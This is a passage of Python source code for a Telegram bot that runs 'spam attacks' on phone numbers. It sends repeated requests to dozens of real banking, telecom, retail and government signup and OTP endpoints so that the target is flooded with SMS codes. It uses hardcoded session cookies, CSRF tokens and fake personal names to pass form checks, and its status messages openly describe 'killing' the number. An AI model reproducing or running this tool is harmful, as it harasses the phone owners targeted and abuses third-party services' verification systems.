                        requests.post('https://bilshe.mastercard.ua/app/api/check-signup-phone', json={'phone':phone[2:],'password':'#6ujKK%%AfsXkey1','confirmPassword':'#6ujKK%%AfsXkey1'}, headers={'X-Requested-With':'XMLHttpRequest', 'X-XSS-Protection': '1; mode=block', 'Cookie': 'cookiesession1=678B28B9XYZABCDEFGHIJKMNOPQR31C6; OptanonAlertBoxClosed=2021-10-28T18:41:50.742Z; OptanonConsent=isIABGlobal=false&datestamp=Thu+Oct+28+2021+21%3A41%3A50+GMT%2B0300+(%D0%B7%D0%B0+%D1%81%D1%85%D1%96%D0%B4%D0%BD%D0%BE%D1%94%D0%B2%D1%80%D0%BE%D0%BF%D0%B5%D0%B9%D1%81%D1%8C%D0%BA%D0%B8%D0%BC+%D0%BB%D1%96%D1%82%D0%BD%D1%96%D0%BC+%D1%87%D0%B0%D1%81%D0%BE%D0%BC)&version=6.10.0&consentId=c931c9d0-2e56-4fd0-8406-75335c3441e6&interactionCount=1&landingPath=NotLandingPage&groups=C015%3A1%2CC016%3A1%2CC0001%3A1%2CC006%3A1%2CC0002%3A1&hosts=H144%3A1%2CH244%3A1%2CH245%3A1%2CH247%3A1; AMCVS_919F3704532951060A490D44%40AdobeOrg=1; AMCV_919F3704532951060A490D44%40AdobeOrg=-1124106680%7CMCMID%7C19357445073970705823786156474307046252%7CMCAAMLH-1636051311%7C6%7CMCAAMB-1636051311%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1635453711s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C5.2.0; s_vnum=1666982511413%26vn%3D1; s_invisit=true; gpv_pn=no%20value; s_cc=true; s_nr=1635446557193-New; s_sq=masterc601%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fbilshe.mastercard.ua%25252F%2526link%253D%2525D0%25259F%2525D0%2525A0%2525D0%25259E%2525D0%252594%2525D0%25259E%2525D0%252592%2525D0%252596%2525D0%252598%2525D0%2525A2%2525D0%252598%2526region%253Droot%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fbilshe.mastercard.ua%25252F%2526oid%253D%2525D0%25259F%2525D0%2525A0%2525D0%25259E%2525D0%252594%2525D0%25259E%2525D0%252592%2525D0%252596%2525D0%252598%2525D0%2525A2%2525D0%252598%2526oidt%253D3%2526ot%253DSUBMIT', 'Referer': 'https://bilshe.mastercard.ua/signup', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control': 'no-cache, private', 'Cache-Control': 'max-age=31536000', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                        print('bilshe.mastercard.ua')
                except:
                        print('Не отправлено (bilshe.mastercard.ua)')
                try:
                        requests.post('https://cabinet.skarb.com.ua/user/register', data={'_csrf': 'mG9Ke7hr_W-jNPBrIONmoYcy4_yhohb65oCkznNj2RruKnw13wWJG-htyAdkmwH3wEW2xcfjTMit5pGlKRXgLA==','login': '+' + number,'password': 'as23Afs312','subscribe': '0','subscribe': '1'}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=300;', 'cookie': 'PHPSESSID=9caf7faf4ea190ac1af68c81cf564e12; _csrf=bdcd3f1b1d4fcd9630fbccd675c6c621e778b9dc164ae0b824a47490bc77b251a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22vE6NgnttKY8lDxgVGwU9fAZ2Kf5kZv96%22%3B%7D; _hjid=ac40cfb3-3566-4f11-80e6-03fa308b762c; _hjFirstSeen=1; _ga=GA1.3.1320069702.1635787230; _gid=GA1.3.666518449.1635787230; _gat_UA-168694557-1=1; label_entry=ascbiiu; _hjAbsoluteSessionInProgress=0; carrotquest_device_guid=46f523f6-661a-40db-a58f-1f08a03ba975; carrotquest_uid=1037496607563582470; carrotquest_auth_token=user.1037496607563582470.20750-1fe4d375c930f1f6c1c80e0db5.5cd10bb1f419ffc0f8a08c1b206fffc14213b56ba506f318; carrotquest_realtime_services_transport=wss; carrotquest_session=iu41d6pco8da14aputbtp7l5snvrtc9l; carrotquest_session_started=1', 'referer': 'https://cabinet.skarb.com.ua/user/register', 'upgrade-insecure-requests': '1', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'max-age=0', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                        print('cabinet.skarb.com.ua')
                except:
                        print('Не отправлено (cabinet.skarb.com.ua)')
                try:
                        requests.post('https://www.nl.ua/ua/personal/', data={'component': 'bxmaker.authuserphone.login','method': 'sendCode','phone': '+' + number,'registration': 'N'}, headers={'X-Requested-With':'XMLHttpRequest', 'cookie': 'PHPSESSID=87j12if7v9o5h0li1jq578fc84; BITRIX_SM_SALE_UID=f506434edf6959334514c71583fee9cf; cookiesession1=678A3E0DPQRSTUV0123456789834B123; _gid=GA1.2.633615997.1636801270; _gac_UA-12429852-1=1.1636801270.Cj0KCQiA4b2MBhD2ARIsAIrcB-SlOsPHMhWXxIZo4CNY8wplpmXy1hCO9iHF41lN13Pd5M6z_4NAGQ8aAidDEALw_wcB; _gat_gtag_UA_12429852_1=1; _gcl_aw=GCL.1636801270.Cj0KCQiA4b2MBhD2ARIsAIrcB-SlOsPHMhWXxIZo4CNY8wplpmXy1hCO9iHF41lN13Pd5M6z_4NAGQ8aAidDEALw_wcB; _gcl_au=1.1.915257014.1636801270; _ga_8ZPHLHGVS0=GS1.1.1636801269.1.1.1636801272.0; _ga=GA1.2.122356831.1636801270', 'referer': 'https://www.nl.ua/ua/personal/', 'referrer-policy': 'no-referrer-when-downgrade', 'server': 'nginx/1.20.1', 'strict-transport-security': 'max-age=31536000;', 'vary': 'Accept-Encoding,User-Agent', 'x-powered-by': 'PHP/5.6.40', 'x-powered-cms': 'Bitrix Site Manager (23046a56eefe26b07f835119ad2f8f24)', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-store, no-cache, must-revalidate, post-check=0, pre-check=0', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36', 'DNT':'1'})
                        print('nl.ua')
                except:
                        print('Не отправлено (nl.ua)')
                try:
                    requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers, proxies=proxies)
                except:
                    print('blaa')
                try:
                    requests.post("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxies=proxies)
                    bot.edit_message_text(chat_id=message.chat.id, message_id=bombedit.message_id, text=f"🌍Спам атака на номер {number} начата! \nТут будет информация об отправке: \n✅Сообщене отправлено")
                except:
                    print('blaa')
                try:
                    requests.post('https://api.telemed.care/oauth/verify_phone_number', json={"phone_number": number}, headers={'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.14.8'})
                    print('telemed.care')
                except:
                    print('Не доставлено (telemed.care)')
                try:#ok
                        requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
                        print('telegram')
                except:
                        print('121212')
                try:
                    requests.post('https://admin.topcredit.ua/api/sms/password-verification/create', json={"phone": number})
                    print('topcredit.ua')
                except:
                    print('Не доставлено (topcredit.ua)')

                try:
                    requests.post('https://chernovtsy.rabota.ru/api-web/v6/code/send.json', json={'request':{'login':"+" + number},'request_id':'90560914','application_id':'13','rabota_ru_id':'616b0c9f211248003394866342942900','user_tags':[{'id':'0','add_date':'2021-10-16','name':'main_page_carees_story_control2'},{'id':'0','add_date':'2021-10-16','name':'careers_main_page_widget_target'},{'id':'0','add_date':'2021-10-16','name':'hr_banners_show'},{'id':'0','add_date':'2021-10-16','name':'hr_login_form_spa'},{'id':'0','add_date':'2021-10-16','name':'vacancy_split_view_careers_widget_target'},{'id':'0','add_date':'2021-10-16','name':'courses_widget_control2'},{'id':'0','add_date':'2021-10-16','name':'usp_company_review_form_target'},{'id':'0','add_date':'2021-10-16','name':'profession_widget_control2'},{'id':'0','add_date':'2021-10-16','name':'web_snippetclick2_control1'},{'id':'0','add_date':'2021-10-16','name':'hr_new_scheduled_action_list_active'},{'id':'0','add_date':'2021-10-25','name':'main_page_careers_story2_control2'}]}, headers={'Cache-Control':'no-store, no-cache, must-revalidate', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':str(user_agent),'cookie': 'frontend:region=chernovtsy%3A1880; frontend:rabota-id:v1=616b0c9f211248003394866342942900; frontend:location:v4=null; tmr_lvid=9baf2ab036dce945b662b83be6d963a2; tmr_lvidTS=1634405541448; _ga=GA1.2.942388139.1634405542; _ym_d=1634405542; _ym_uid=1634405542182425930; user_tags=%5B%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22main_page_carees_story_control2%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22careers_main_page_widget_target%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22hr_banners_show%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22hr_login_form_spa%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22vacancy_split_view_careers_widget_target%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22courses_widget_control2%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22usp_company_review_form_target%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22profession_widget_control2%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22web_snippetclick2_control1%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-16%22%2C%22name%22%3A%22hr_new_scheduled_action_list_active%22%7D%2C%7B%22id%22%3A0%2C%22add_date%22%3A%222021-10-25%22%2C%22name%22%3A%22main_page_careers_story2_control2%22%7D%5D; mobile-app-popup-next-show-timer=1; mobile-app-popup-close-count=11; tmr_reqNum=16; qrator_ssid=1635339916.326.pKcDG62ujL7G3tOC-f1d0aj2bb2ut8r38h6n8mu2fc5umnsta; story_group_count=4; story_group_time=Wed%20Oct%2027%202021%2016%3A05%3A34%20GMT%2B0300%20(GMT%2B03%3A00); _gid=GA1.2.424888797.1635339936; _gat_gtag_UA_3926701_1=1; SRVID=front2-msk2.rabota|YXlOr|YXlOo; sid=6nEXiaDr2f7eGfJwdbRucfa7mo8lzigp', 'referer': 'https://chernovtsy.rabota.ru/?page=0', 'vary': 'Accept-Encoding', 'x-content-type-options': 'nosniff', 'x-xss-protection': '1; mode=block'})
                    print('rabota.ru')
                except:
                    print('Не доставлено(rabota.ru)')

                try:
                    requests.post('https://urm.sat.ua/openws/hs/api/v2.0/auth/check/json?phone=' + phone_plus + '&app=cabinet&language=uk')   
                    print('sat.ua')
                except:
                    print('Не отправлено (sat.ua)')

                try:
                    requests.get('https://findclone.ru/register?phone=+' + number + '', headers={'User-Agent': str(user_agent),'X-Requested-With': 'XMLHttpRequest'})
                    print('findclone.ru')
                except:
                    print('Не доставлено (findclone.ru)')

                try:
                    requests.post('https://call2friends.com/call-my-phone/web/request-free-call', params={'phone': number,'domain':'CALL2FRIENDS','browser':'{\"mozilla\":true,\"version\":\"89.0\"}','fgp':str(uuid.uuid4()),'fgp2':str(uuid.uuid4())}, headers={'Cookie':'smscookie=' + str(uuid.uuid4())})
                    print('call2friends.com')
                except:
                    print("sdkjfh") 
            bot.edit_message_text(chat_id=message.chat.id, message_id=bombedit.message_id, text=f"✅Спам атака на номер {number} завершена. \nОтзыв вы можете отправить сюдa: @termqew")
            try:
                database = pickle.load( open( "database.p", "rb" ) )
                database["bmb_ids"].remove(chat_id)
                pickle.dump( database, open("database.p", "wb") )
            except Exception as e:
                send_to_adms("1 " + str(e))
            try:
                database = pickle.load( open( "database.p", "rb" ) )
                database["bmb_numbers"].remove(number)
                pickle.dump( database, open("database.p", "wb") )
            except Exception as e:
                send_to_adms("2 " + str(e))
    except Exception as e:
        print(e) 
        bot.send_message(message.from_user.id, f"Убедитесь, что номер нужного формата и поторите попытку")
        main_menu(message)

def start_bombing_ru(message):
    chat_id = message.from_user.id
    phone = message.text
    if message.text == '🔴 Стоп':
        bot.clear_step_handler_by_chat_id(chat_id=message.chat.id)
        bot.send_message(message.from_user.id, f'✅Вы отменили атаку')
        main_menu(message)
        return
    try:
        database = pickle.load( open( "database.p", "rb" ) )

        if chat_id not in database["bmb_ids"]:
            database = pickle.load( open( "database.p", "rb" ) )
            database["bmb_ids"].append(chat_id)
            pickle.dump( database, open("database.p", "wb") )
        else:
            bot.send_message(message.from_user.id, f"Этот номер уже атакуеться! Подождите до конца завершения прошлих цыклов")
            main_menu(message)
            return

        if phone not in database["bmb_numbers"]:
            database = pickle.load( open( "database.p", "rb" ) )
            database["bmb_numbers"].append(phone)
            pickle.dump( database, open("database.p", "wb") )
        else:
            bot.send_message(message.from_user.id, f"Этот номер уже атакуеться! Подождите до конца завершения прошлих цыклов")
            return

        phone_plus = '+' + phone
        z = phonenumbers.parse(phone_plus, None)
        name = message.from_user.first_name
        send_to_adms(f'💣Пользователь {name} хочет проспамить номер:  {phone} ({z})')
           
        if z == False:
            bot.send_message(message.from_user.id, f"Номер не верный")
        else:
            database = pickle.load( open( "database.p", "rb" ) )
            try:
                database["atk_times"][message.from_user.username] += 1
            except:
                database["atk_times"][message.from_user.username] = 1
            database["atk_day"].append(datetime.now())
            pickle.dump( database, open("database.p", "wb") )

            main_menu(message)
            bot.send_message(message.from_user.id, "*📱Общая информация о номере:*" + "\n├" + str(z) + '\n├Страна - ' + str(geocoder.description_for_number(z, "ru")) + '\n├Оператор - ' + str(carrier.name_for_number(z, 'en')) + '\n╰Часовой пояс - ' + str(timezone.time_zones_for_number(z)), parse_mode='Markdown')
            bombedit = bot.send_message(message.chat.id, f'*✅Спам атака на номер {phone} начата!* \n\nТут будет информация о статусе:', parse_mode='Markdown')
            bot.send_message(message.chat.id, "Спам на Россию еще в разработке, поэтому сообщенй мало")
            for _ in range(5):
                bot.edit_message_text(chat_id=message.chat.id, message_id=bombedit.message_id, text=f'*✅Спам атака на номер {phone} начата!* \n\nТут будет информация о статусе: \n🕙Подготовка нового цыкла', parse_mode='Markdown')
                bot.edit_message_text(chat_id=message.chat.id, message_id=bombedit.message_id, text=f'*✅Спам атака на номер {phone} начата!* \n\nТут будет информация о статусе: \n💣Убиваю номер...', parse_mode='Markdown')
                try:
                    requests.post('https://api-ege.interneturok.ru/passport/register', data={'user[email]': 'joajfsfsa@gmail.com','user[password]': '3Nj.NRkbf4xWHLj','country': '','user[phone]': phone_plus,'user[name]': 'Мора','user[class]': '5','user[genitor_name]': 'Ольда','gtoken': '03AGdBq24YClhZ5pCkzNMwX7ZD5lj9rt3k8CM-BTEK2I1U7K1CJ-RtzmJmBNfDoAsZ0A4zKs4ObnPhnt9QnSnLAzb0oZBBFoAf4f07UantBBCIcF65NDx567hiyA-jhMJwIZmXoDIuqIfsZrhEqrctlPsmz4IvU0cNsgbgmHe9z3b7kdUFoL_-bynrahKUvn4Nis2cjGgP7-pzbLZ-36TwBHrx2sXW5qGoDEdREpQhaEXehIxVAUGcnCQiuiBEcFn5aSChv5bC6MOvyXre65FyRcHYkllUQwUd4fJcv17YmwIlFiWA5kWlUvA0yowbS9z-2Y1N3GSOi-1bhik850b7SEfndx8DIJ1SHquXpKrUCQ_f8BLFXzvryOJ0cpQegdXRQeDSr_gLgJcw8AXp9RdaE4msiQ89jjakQH38y_5CWDOuiJkHmxTTmEx0rSIPfDu3KBex-pkni_HUy9Nm6DAanjsQi6NBYjJicHFHE-Ur5BLR6RrbKCcqUZ0','agree': '6'}, headers={'X-Requested-With':'XMLHttpRequest','Connection': 'keep-alive','Accept-Encoding': 'gzip, deflate, br','Referer': 'https://home-school.interneturok.ru/','user-agent': str(user_agent),'DNT':'1'})
                except Exception as e:
                    pass


                try:
                    requests.post('https://mob-app.rolf.ru/api/v4/auth/register/request-sms-code', json={'phone': phone}, headers={'accept-language': 'uk', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.14.9'})
                except Exception as e:
                    pass

                try:
                    requests.post('https://zvuk.com/api/tiny/get-otp', params={"phone": phone_plus, "type": "login", "length": "10"}, headers={'User-Agent':'OpenPlay|4.5.4|Android|11|Xiaomi M2010J19SY','Accept-Encoding':'gzip, deflate, br'})
                except Exception as e:
                    pass

                try:
                    requests.post('https://discord.com/api/v9/auth/register/phone', json={'phone': phone_plus})
                except Exception as e:
                    pass
                try:
                    requests.post('https://smartcash.ru/register/welcome', data={'_csrf': '06uVSZTmUjHsGVB-iMMhFU-syNakcCnevtSu2mvKAyinwvoO1548d5ZzMg7jjBFZLMiivsMUa-zknd-UXqExZw==', 'UserRegisterWelcomeForm[last_name]': 'Лось', 'UserRegisterWelcomeForm[first_name]': 'Олег', 'UserRegisterWelcomeForm[middle_name]': '', 'UserRegisterWelcomeForm[no_middle_name]': '0', 'UserRegisterWelcomeForm[no_middle_name]': '1', 'UserRegisterWelcomeForm[phone]': phone_mask_SmartCash, 'UserRegisterWelcomeForm[email]': 'jnkfsa@gmail.com', 'UserRegisterWelcomeForm[agree_personal_data]': '0', 'UserRegisterWelcomeForm[agree_personal_data]': '1', 'UserRegisterWelcomeForm[agree_contract]': '0', 'UserRegisterWelcomeForm[agree_contract]': '1', 'UserRegisterWelcomeForm[agree_bki]': '0', 'UserRegisterWelcomeForm[agree_bki]': '1'}, headers={'Upgrade-Insecure-Requests': '1', 'User-Agent': str(user_agent), 'Referer': 'https://smartcash.ru/register/welcome', 'Cookie': 'PHPSESSID=qlugovqbmmg7ppl10d03ll8gt5; _csrf=e93e0a97dc273e598a12e3cf30800b684bb8ea994cf9dfe62b5f42977a4a588da%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22tioGCxnFzjbpkO0LcdjhgdB2ZIqN5k2O%22%3B%7D; _rf=642c488ed914d746d2017677995ff3594f1442a39b5764a1fcc66403a1b3c174a%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22_rf%22%3Bi%3A1%3Bs%3A36%3A%22d1b796ca-1a5b-4dbc-b51a-852c4f0f4f53%22%3B%7D; _ym_uid=1639158076299333556; _ym_d=1639158076; _ym_isad=1; _ym_visorc=w'})
                except Exception as e:
                    pass

                try:
                    requests.post('https://mobile.api.crpt.ru/mobile/login', json={"phone":phone}, headers={'accept-encoding': 'gzip', 'user-agent': 'Platform: Android 10 (API 29); Device: Xiaomi Mi 9T Pro; AppVersion: 4.20.1; AppVersionCode: 148;', 'application-id': 'b2c', 'x-access-token': '', 'user-id': '-1'})
                except Exception as e:
                    pass

                try:
                    requests.post('https://api.metro-cc.ru/auth/api/v1/public/send_otp', json={'phone':phone_plus,'smsHash':'hi2LBOdVq64'}, headers={'authorization':'9c0fe65e-51a9-4b7c-a54d-b2b28f3a922f'})
                except Exception as e:
                    pass

                try:
                    requests.post('https://bmp.tv.yota.ru/api/v10/auth/register/msisdn', json={"msisdn":phone,"password":"32131231"}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36','Referer': 'https://tv.yota.ru/','Cookie': 'SessionID=JrvK-OKxW9olYNZ_lRRiTRWeCxC6c0m6jNKEawc5_YM; _gid=GA1.2.999494451.1638263482; _ga_94TC7EBHF1=GS1.1.1638263481.1.0.1638263481.60; _ga=GA1.2.205106720.1638263482; _dc_gtm_UA-16019436-1=1; _dc_gtm_UA-16019436-35=1','Accept-Encoding': 'gzip, deflate, br'})
                except Exception as e:
                    pass

                try:
                    requests.post('https://x.tochka.com/api/v1/auth/v3/public', json={'id':'caece419-b6f1-0ea4-b953-338c2c7399c5','jsonrpc':'2.0','method':'second_factor_auth','params':{'value':phone_plus,'auth_method':'smsotp'}}, headers={'user_agent':str(user_agent)})
                except Exception as e:
                    pass
                try:
                    requests.post('https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android', json={'phone':phone})
                except Exception as e:
                    pass

                try:
                    requests.post('https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode', json={"PhoneNumber":phone}, headers={'User-Agent': 'Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'})
                except Exception as e:
                    pass

                try:
                    requests.post('https://disk.megafon.ru/api/3/md_otp_tokens/', json={'phone': phone_plus})
                except Exception as e:
                    pass

                try:
                    requests.get('https://identity.beeline.ru/identity/generateonetimepassword?login=' + phone + '', headers={'Accept-Encoding': 'gzip, deflate, br','Referer': 'https://moskva.beeline.ru/customers/products/','User-Agent':str(user_agent)})
                except Exception as e:
                    pass

                try:
                    requests.post('https://lk.megafon.ru/api/auth/otp/request?CSRF=e78450da-1466-40e6-aca7-9d62561d73aa', data={'login': phone_9,'captcha': '','captchaReady': 'true'}, headers={'X-Requested-With':'XMLHttpRequest','Cookie': '_gcl_au=1.1.1235163959.1638727452; _ga=GA1.2.836945431.1638727454; tmr_lvid=20aa548ad9374b8e65f3a066983c2d50; tmr_lvidTS=1638727455105; mid=311ef8fa-342b-49e1-9052-8b5c50523903; _ym_uid=1638727457709263185; _ym_d=1638727457; DEVICE-ID=dc067f25-3eda-44c3-ba56-ec5d6eec44d9; NEW-FRONT-LK-TOKEN=98824987-e868-4dc2-93d4-47c4206cd505; _gid=GA1.2.1998952435.1639129633; _ym_isad=1; rtip=0; old_adriver_views_time=1639132033468; mindboxDeviceUUID=82126a09-4a8c-4f69-bc71-5dbd8e3a14a3; directCrm-session=%7B%22deviceGuid%22%3A%2282126a09-4a8c-4f69-bc71-5dbd8e3a14a3%22%7D; tmr_reqNum=26; APP-VERSION=6.56.3_891; CSRF-TOKEN=e78450da-1466-40e6-aca7-9d62561d73aa; AUTOLOGIN_LOCK=; JSESSIONID=0fb11f5e-1596-4653-85aa-c360f6909848.3A; NGX-CACHE-VERSION=6.56.3_891; _dc_gtm_UA-18264094-104=1; _dc_gtm_UA-47701048-1=1; lk-front=ffffffff0900fd0445525d5f4f58455e445a4a423660', 'Referer': 'https://lk.megafon.ru/api/login/','User-Agent': str(user_agent),'DNT':'1'})
                except Exception as e:
                    pass

                try:
                    requests.get('https://tele2.kz/apigw/v1/auth/client-status?msisdn=' + phone + '', headers={'accept-encoding': 'gzip, deflate, br','ADRUM':'isAjax:true','Authorization': 'Basic SU9TOg==','clientType': 'WEB','Cookie': '_ga=GA1.2.740236717.1638263689; BIGipServerbeta.tele2.kz=722270730.20480.0000; i18next_lang=ru; _gcl_au=1.1.273398257.1639060570; _gid=GA1.2.7628864.1639060583; _gat_UA-187473077-1=1; _gat_UA-170277432-1=1; _gat_UA-23114796-1=1','fingerPrint': '660a2e788e51863c3b0a62a1289d9ab2','operatorType': 'TELE2','Referer': 'https://tele2.kz/me/sign','User-Agent': str(user_agent)})
                except Exception as e:
                    pass
                try:#ok
                        requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
                        print('telegram')
                except:
                        print("mocha")

                try:
                    requests.post('https://lknpd.nalog.ru/api/v1/auth/challenge/sms/start', json={"phone":phone}, headers={'Connection': 'Keep-Alive','Accept-Encoding': 'gzip','User-Agent': 'okhttp/3.12.13'})
                except Exception as e:
                    pass

                try:
                    requests.post('https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration', json={'password':'',  'login':phone}, headers=head)
                except Exception as e:
                    pass
                try:
                    requests.post('https://cnt-vlmr-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code', params={'action': 'register','phone': phone}, headers={'session_id':'24f8bbf7-60d3-11ec-b71d-4857027601a0:1951416:2237006:2'})
                except Exception as e:
                    pass

                try:
                    requests.post('https://api.kazanexpress.ru/api/v2/account/register/customer', json={"phone":phone_9,"platform":"ANDROID"}, headers={'Authorization': 'Basic a2F6YW5leHByZXNzLWFuZHJvaWQ6YW5kcm9pZFNlY3JldEtleQ==','User-Agent': 'KazanExpress/Android (com.kazanexpress.ke_app; 1.6.5)','Connection': 'Keep-Alive','X-IID': '5c237ebe-af1d-4a09-b533-46841630a665'})
                except Exception as e:
                    pass

                try:
                    requests.post('https://zdravcity.ru/api/getPasswordFromSms/', json={"phone":phone_plus}, headers={'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.12.1', 'authorization': 'Basic bmV3X21vdXNlOjczNzM1MDA=', 'platform': 'android', 'client-version': '2.4.176'})
                except Exception as e:
                    pass
                try:
                    requests.post('https://robocredit.ru/api/v1/registration/code/send', json={'phone': phone,'email': 'jeh23bas@gmail.com','firstName':'Олег','middleName':'Лось','lastName': 'Олегович','via':'sms'}, headers={'Authorization':'react_application_client','Cookie':'XSRF-TOKEN=eyJpdiI6IkZDMFloNzZzRkhBRjhzSTVyaHFWQVE9PSIsInZhbHVlIjoieFNVY0drVGR2blB0UlZBVWY4QjNZSm5DZHdSdDM0WUxpUkZDeW8ydGlxSDdJcnZzYWxITzhCMmJqSlp3Wk5TMmtldEpwdG9NREkwcWdDcUFoRXZvUEEyT1NBL2VSUkRRdTQ1UlA4bkdhVE0xVlBSZW5qWGlPZU5hVUxlRHBjOU8iLCJtYWMiOiI2NDQ2M2VhZTRlMjJhYjg0OGY1ODA5MjVjMGRkNzJkMDQzMGQwZWNmNGIzMDBiZjJiYjdhOTljYzUyNTQ5ZTk3In0%3D; robocredit_session=eyJpdiI6InVyOExObXVjNkdZSFdRdW4zRU5LbWc9PSIsInZhbHVlIjoid0N5NFBYa1EzRW02NDdETlJmSG53eHdDZ1hRaVZLUDRUSUh6aVZmQ2JhSW8xK1NxTjhrd2dMbmtYSWV2OS8remlRNEhnVFlROWZhK2NGekJqcEdrSWJoY3NwNmFVcEpEbmJlWWc3NmRELzFHbW8vVk45K2VEUHRSdkFtem1tYTMiLCJtYWMiOiIxZTcwNTMxOGFkMmI1ZmZlOWNlOTc1Y2I3M2I3ZGUxMDVjZmM2MTVjODkwMzg3YmRlMDg3ZjY1ODgyNTEyNDRhIn0%3D; SERVERID=node01; __cfruid=88814902276cd09899db6bf2f44fdfe49ec80785-1628344822; tmr_reqNum=5; tmr_lvid=a9af81bd62954373fb30b1dbe5852790; tmr_lvidTS=1628344829462; tmr_detect=1%7C1628344829552; _ga=GA1.2.572378467.1628344830; _gid=GA1.2.1844127440.1628344830; _ym_uid=1628344830347478702; _ym_d=1628344830; ec_cache=1cba26dce8b888347624658d3bdfcff49f84d75e0bae3a1850283ec2d9e1eca4; ec_etag=1cba26dce8b888347624658d3bdfcff49f84d75e0bae3a1850283ec2d9e1eca4; __utma=231239964.572378467.1628344830.1628344831.1628344831.1; __utmb=231239964.0.10.1628344863231; __utmc=231239964; __utmz=231239964.1628344831.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ym_isad=1; supportOnlineTalkID=FzrLpzswSp3numy4EJfLVCoCkQJaZTF4; _fbp=fb.1.1628344831572.99578837; _ym_visorc=w; ec_png=1cba26dce8b888347624658d3bdfcff49f84d75e0bae3a1850283ec2d9e1eca4; ec_id=1cba26dce8b888347624658d3bdfcff49f84d75e0bae3a1850283ec2d9e1eca4','Referer': 'https://robocredit.ru/registration/personal','TE': 'trailers','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0','X-CSRF-TOKEN': 'YufMbFkxmcj9sbFGo8MSy11ZLlSPXcQtLRFqjfoZ','X-Requested-With':'XMLHttpRequest','X-XSRF-TOKEN':'eyJpdiI6IkZDMFloNzZzRkhBRjhzSTVyaHFWQVE9PSIsInZhbHVlIjoieFNVY0drVGR2blB0UlZBVWY4QjNZSm5DZHdSdDM0WUxpUkZDeW8ydGlxSDdJcnZzYWxITzhCMmJqSlp3Wk5TMmtldEpwdG9NREkwcWdDcUFoRXZvUEEyT1NBL2VSUkRRdTQ1UlA4bkdhVE0xVlBSZW5qWGlPZU5hVUxlRHBjOU8iLCJtYWMiOiI2NDQ2M2VhZTRlMjJhYjg0OGY1ODA5MjVjMGRkNzJkMDQzMGQwZWNmNGIzMDBiZjJiYjdhOTljYzUyNTQ5ZTk3In0='})
                except Exception as e:
                    pass

                try:
